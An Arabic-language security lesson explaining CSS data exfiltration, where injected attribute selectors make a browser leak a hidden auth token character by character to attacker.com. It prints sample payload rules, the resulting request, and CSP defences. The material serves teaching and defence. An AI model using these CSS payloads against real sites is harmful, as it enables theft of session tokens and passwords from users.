# 06 - تسريب البيانات الحساسة عبر محددات CSS الخالصة (CSS Data Exfiltration)

> 🌐 **Language / اللغة:** [English 🇬🇧](../en/06-css-data-exfiltration.md) | [العربية 🇸🇦](./06-css-data-exfiltration.md)

---

## 📌 1. أسطورة "ملفات التنسيق غير الضارة"

يعامل الكثير من المطورين وفاحصي الثغرات حقن أكواد CSS (CSS Injection) على أنه مجرد عبث شكلي عديم الخطورة ("أقصى ما يمكن للمهاجم فعله هو تلوين الخلفية بالأحمر أو إخفاء زر").

هذا الافتراض خاطئ وخطر للغاية.

عبر تقنية **تسريب البيانات بواسطة CSS (CSS Data Exfiltration)**، يستطيع المهاجم استخراج كلمات المرور، رموز الجلسات السرية، والبيانات الخاصة **حرفاً بحرف وبشكل تسلسلي** باستخدام محددات خصائص CSS فقط ودون كتابة سطر واحد من كود جافا سكريبت!

---

## ⚔️ 2. آلية الهجوم: محددات الخصائص كمجسات سرية

افترض موقعاً يتيح للمستخدمين تخصيص واجهاتهم بأكواد CSS، أو يفشل في تنقية وسوم `<style>`.

تحتوي الصفحة المستهدفة على حقل إدخال مخفي يحمل رمزاً سرياً:
```html
<input type="password" name="auth_token" value="s3cr3t">
```

### حزمة قواعد CSS المحقونة:
يصنع المهاجم قاموساً من محددات البادئة (`^=`) لاستهداف الحرف الأول من قيمة `value`:

```css
/* مطابقة الحرف الأول للرمز السري */
input[name="auth_token"][value^="a"] { background-image: url("https://attacker.com/leak?char=a"); }
input[name="auth_token"][value^="b"] { background-image: url("https://attacker.com/leak?char=b"); }
...
input[name="auth_token"][value^="s"] { background-image: url("https://attacker.com/leak?char=s"); }
```

### تسلسل التنفيذ في المتصفح:
1. عند فتح الضحية للصفحة، يحلل المتصفح شجرة الـ DOM ويطابق قواعد CSS على حقل الإدخال `<input>`.
2. يكتشف المتصفح أن قيمة `value` تبدأ فعلياً بالحرف `"s"`.
3. يطبق المتصفح القاعدة ويطلق فوراً طلب HTTP في الخلفية لتحميل صورة الخلفية:
   ```http
   GET /leak?char=s HTTP/1.1
   Host: attacker.com
   ```
4. يستقبل سيرفر المهاجم الطلب ويسجل الحرف الأول: `"s"`.

### استخراج بقية الأحرف بالتسلسل:
عبر استدعاءات `@import` التكرارية أو التوليد اللحظي لملفات CSS من السيرفر، يطلب المهاجم الجولة التالية:
```css
input[name="auth_token"][value^="sa"] { background-image: url("https://attacker.com/leak?char=sa"); }
input[name="auth_token"][value^="sb"] { background-image: url("https://attacker.com/leak?char=sb"); }
...
input[name="auth_token"][value^="s3"] { background-image: url("https://attacker.com/leak?char=s3"); }
```
وفي ثوانٍ معدودة، يُسرق النص السري بالكامل (`s3cr3t`) حرفاً بحرف!

## 🛡️ 3. كيفية الحماية وسد ثغرات CSS Data Exfiltration

### خط الدفاع 1: سياسة أمان محتوى صارمة لـ `style-src`
احظر استخدام `'unsafe-inline'` في سياسة الـ CSP:
```http
Content-Security-Policy: default-src 'self'; style-src 'self';
```
بهذه السياسة، يرفض المتصفح أي كتل `<style>` محقونة أو خصائص تنسيق مضمنة `style="..."`.

### خط الدفاع 2: تقييد مصادر جلب الصور والخطوط
امنع لغة CSS من طلب موارد وخلفيات من خارج نطاقك:
```http
Content-Security-Policy: img-src 'self'; font-src 'self'; style-src 'self';
```
حتى لو نجح حقن كود CSS، سيرفض المتصفح إرسال طلب صورة الخلفية إلى سيرفر المهاجم.

### خط الدفاع 3: لا تطبع أسرار الجلسات في خصائص الـ DOM الثابتة
تجنب طباعة رموز التحقق أو كلمات المرور في خصائص HTML مباشرة إن كان الموقع يسمح بتخصيص التنسيق للمستخدمين.

---

## 🎯 ملخص وتحدي الدرس

- لغة CSS محرك استعلام قوي قادر على استخراج البيانات والتنصت عليها.
- محددات الخصائص (`[value^="..."]`) تطلق طلبات شبكة خارجية فور مطابقة الحروف.
- صد الهجوم يتطلب إلغاء `'unsafe-inline'` من `style-src` وحظر الاتصالات الخارجية في `img-src`.
